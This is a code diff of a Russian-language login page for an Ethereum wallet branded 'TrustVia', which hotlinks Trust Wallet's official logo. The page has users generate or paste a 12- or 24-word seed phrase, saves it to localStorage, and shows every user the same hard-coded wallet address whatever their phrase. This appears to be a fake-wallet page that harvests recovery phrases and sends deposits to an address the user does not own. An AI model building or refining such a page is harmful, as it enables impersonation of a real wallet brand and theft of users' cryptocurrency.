@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TrustVia — Вход / Регистрация</title>
+    <title>TrustVia — Вход</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/index.min.js"></script>
     <style>
@@ -16,129 +16,136 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             padding: 2rem;
         }
-        .container { width: 100%; max-width: 24rem; }
         .logo { width: 6rem; margin-bottom: 1.5rem; filter: drop-shadow(0 0 1.5rem rgba(0,214,118,0.4)); }
-        h1 { font-size: 3.5rem; font-weight: 900; letter-spacing: -0.1rem; background: linear-gradient(to right, #00d676, #00e07f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; text-align: center; }
-        .subtitle { color: #9ca3af; font-size: 1.125rem; margin-bottom: 2.5rem; text-align: center; }
-        .btn { padding: 1.25rem 1.5rem; font-size: 1.125rem; font-weight: 700; border-radius: 9999px; cursor: pointer; transition: all 0.25s ease; width: 100%; margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.05em; }
+        h1 { font-size: 3.5rem; font-weight: 900; background: linear-gradient(to right, #00d676, #00e07f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; text-align: center; }
+        .btn {
+            padding: 1.25rem;
+            font-size: 1.125rem;
+            font-weight: 700;
+            border-radius: 9999px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 20rem;
+            margin: 0.75rem 0;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
         .btn-primary { background: linear-gradient(135deg, #00d676, #00e07f); color: black; border: none; box-shadow: 0 6px 20px rgba(0,214,118,0.35); }
-        .btn-primary:active { transform: scale(0.97); box-shadow: 0 4px 12px rgba(0,214,118,0.5); }
+        .btn-primary:active { transform: scale(0.96); box-shadow: 0 4px 12px rgba(0,214,118,0.5); }
         .btn-outline { border: 1px solid #444; color: #00d676; background: transparent; }
-        .btn-outline:active { background: rgba(0,214,118,0.12); transform: scale(0.97); }
-        .back-btn { color: #00d676; font-weight: 600; font-size: 1rem; background: none; border: none; padding: 0; margin-bottom: 1.5rem; cursor: pointer; text-align: left; width: 100%; }
-        textarea { background: #141414; border: 1px solid #444; color: white; border-radius: 1.5rem; padding: 1.125rem; font-family: monospace; font-size: 0.95rem; resize: none; outline: none; transition: all 0.2s; height: 9rem; width: 100%; }
-        textarea:focus { border-color: #00d676; box-shadow: 0 0 0 3px rgba(0,214,118,0.25); }
-        .error-msg { color: #ff4d4d; font-size: 0.875rem; margin-top: 0.625rem; display: none; text-align: center; }
-        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; background: #111; padding: 20px; border-radius: 20px; border: 1px solid #222; margin: 24px 0; }
-        .word-item { color: #ccc; font-size: 14px; font-family: monospace; text-align: center; padding: 10px; background: #1a1a1a; border-radius: 10px; }
-        .section { display: none; width: 100%; }
+        .btn-outline:active { background: rgba(0,214,118,0.12); transform: scale(0.96); }
+        .section { display: none; width: 100%; max-width: 20rem; margin-top: 2rem; }
+        .back { color: #00d676; font-size: 1.1rem; margin-bottom: 1rem; cursor: pointer; }
+        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.75rem; background: #111; padding: 1.25rem; border-radius: 1.25rem; border: 1px solid #222; margin: 1.5rem 0; }
+        .word-item { color: #ccc; font-size: 0.875rem; font-family: monospace; text-align: center; padding: 0.625rem; background: #1a1a1a; border-radius: 0.625rem; }
+        textarea { width: 100%; height: 8rem; background: #141414; border: 1px solid #444; color: white; border-radius: 1.5rem; padding: 1rem; font-family: monospace; font-size: 0.95rem; resize: none; }
+        textarea:focus { border-color: #00d676; outline: none; box-shadow: 0 0 0 3px rgba(0,214,118,0.25); }
+        .error { color: #ff4d4d; font-size: 0.875rem; margin-top: 0.5rem; text-align: center; display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Главный экран -->
-        <div id="main-screen">
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" class="logo animate-pulse" alt="TrustVia">
-            <h1>TrustVia</h1>
-            <p class="subtitle">Ваш Ethereum кошелёк</p>
 
-            <button class="btn btn-primary" onclick="showCreate()">Создать новый кошелёк</button>
-            <button class="btn btn-outline" onclick="showImport()">Импортировать кошелёк</button>
-        </div>
+    <!-- Главный экран -->
+    <div id="main">
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" class="logo" alt="TrustVia">
+        <h1>TrustVia</h1>
+        <p class="text-zinc-400 mt-2 mb-8 text-center">Ваш Ethereum кошелёк</p>
 
-        <!-- Создание кошелька -->
-        <div id="create-screen" class="section">
-            <button class="back-btn" onclick="showMain()">← Назад</button>
-            <h2 class="text-2xl font-bold mb-4 text-center">Ваша секретная фраза</h2>
-            <p class="text-zinc-400 mb-6 text-center text-sm">Запишите эти 12 слов в правильном порядке и храните в безопасном месте. Никому не показывайте!</p>
-            <div id="word-grid" class="word-grid"></div>
-            <button class="btn btn-primary mt-6" onclick="confirmCreate()">Я записал фразу</button>
-        </div>
+        <button class="btn btn-primary" onclick="showCreate()">Создать кошелёк</button>
+        <button class="btn btn-outline" onclick="showImport()">Импортировать</button>
+    </div>
 
-        <!-- Импорт кошелька -->
-        <div id="import-screen" class="section">
-            <button class="back-btn" onclick="showMain()">← Назад</button>
-            <h2 class="text-2xl font-bold mb-4 text-center">Импорт кошелька</h2>
-            <p class="text-zinc-400 mb-6 text-center text-sm">Введите 12 или 24 слова через пробел</p>
-            <textarea id="phraseInput" placeholder="word1 word2 word3 ..."></textarea>
-            <p id="import-error" class="error-msg"></p>
-            <button class="btn btn-primary mt-6" onclick="handleImport()">Восстановить кошелёк</button>
-        </div>
+    <!-- Создание -->
+    <div id="create" class="section">
+        <div class="back" onclick="showMain()">← Назад</div>
+        <h2 class="text-2xl font-bold mb-4 text-center">Секретная фраза</h2>
+        <p class="text-zinc-400 mb-6 text-center text-sm">Запиши эти слова в правильном порядке. Никому не показывай!</p>
+        <div id="words" class="word-grid"></div>
+        <button class="btn btn-primary mt-6" onclick="goToWalletFromCreate()">Я записал</button>
+    </div>
+
+    <!-- Импорт -->
+    <div id="import" class="section">
+        <div class="back" onclick="showMain()">← Назад</div>
+        <h2 class="text-2xl font-bold mb-4 text-center">Импорт</h2>
+        <p class="text-zinc-400 mb-6 text-center text-sm">Введи 12 или 24 слова через пробел</p>
+        <textarea id="phrase" placeholder="word1 word2 word3 ..."></textarea>
+        <div id="err" class="error"></div>
+        <button class="btn btn-primary mt-6" onclick="goToWalletFromImport()">Восстановить</button>
     </div>
 
     <script>
-        const mainScreen = document.getElementById('main-screen');
-        const createScreen = document.getElementById('create-screen');
-        const importScreen = document.getElementById('import-screen');
-        let currentMnemonic = '';
+        const main = document.getElementById('main');
+        const create = document.getElementById('create');
+        const importSec = document.getElementById('import');
+        let mnemonic = '';
 
         function showMain() {
-            mainScreen.style.display = 'block';
-            createScreen.style.display = 'none';
-            importScreen.style.display = 'none';
+            main.style.display = 'block';
+            create.style.display = 'none';
+            importSec.style.display = 'none';
         }
 
         function showCreate() {
-            mainScreen.style.display = 'none';
-            createScreen.style.display = 'block';
-            importScreen.style.display = 'none';
+            main.style.display = 'none';
+            create.style.display = 'block';
+            importSec.style.display = 'none';
 
-            currentMnemonic = bip39.generateMnemonic();
-            const words = currentMnemonic.split(' ');
+            mnemonic = bip39.generateMnemonic();
+            const words = mnemonic.split(' ');
             let html = '';
-            words.forEach((word, i) => {
-                html += `<div class="word-item">${i + 1}. ${word}</div>`;
-            });
-            document.getElementById('word-grid').innerHTML = html;
+            words.forEach((w, i) => html += `<div class="word-item">${i+1}. ${w}</div>`);
+            document.getElementById('words').innerHTML = html;
         }
 
         function showImport() {
-            mainScreen.style.display = 'none';
-            createScreen.style.display = 'none';
-            importScreen.style.display = 'block';
+            main.style.display = 'none';
+            create.style.display = 'none';
+            importSec.style.display = 'block';
         }
 
-        function confirmCreate() {
-            if (!confirm('Вы точно записали все слова?\nЭто последний шанс увидеть фразу!')) return;
-            localStorage.setItem('mnemonic', currentMnemonic);
+        function goToWalletFromCreate() {
+            if (!confirm('Ты точно записал все слова?\nБольше их не увидишь!')) return;
+            localStorage.setItem('mnemonic', mnemonic);
             localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
             window.location.href = 'index.html';
         }
 
-        function handleImport() {
-            const phrase = document.getElementById('phraseInput').value.trim();
-            const errorEl = document.getElementById('import-error');
-            errorEl.style.display = 'none';
+        function goToWalletFromImport() {
+            const phrase = document.getElementById('phrase').value.trim();
+            const err = document.getElementById('err');
+            err.style.display = 'none';
 
             if (!phrase) {
-                errorEl.textContent = 'Введите секретную фразу';
-                errorEl.style.display = 'block';
+                err.textContent = 'Введи фразу';
+                err.style.display = 'block';
                 return;
             }
 
             const words = phrase.split(/\s+/).filter(w => w);
             if (words.length !== 12 && words.length !== 24) {
-                errorEl.textContent = 'Должно быть ровно 12 или 24 слова';
-                errorEl.style.display = 'block';
+                err.textContent = 'Нужно ровно 12 или 24 слова';
+                err.style.display = 'block';
                 return;
             }
 
             if (!bip39.validateMnemonic(phrase)) {
-                errorEl.textContent = 'Неверная фраза — слова не из словаря или контрольная сумма не совпадает';
-                errorEl.style.display = 'block';
+                err.textContent = 'Фраза неверная';
+                err.style.display = 'block';
                 return;
             }
 
-            if (!confirm('Вы уверены, что ввели фразу правильно?\nЭто восстановит доступ к кошельку.')) return;
+            if (!confirm('Ты уверен? Это восстановит кошелёк')) return;
 
             localStorage.setItem('mnemonic', phrase);
             localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
             window.location.href = 'index.html';
         }
 
-        // Начало — главный экран
         showMain();
     </script>
 </body>
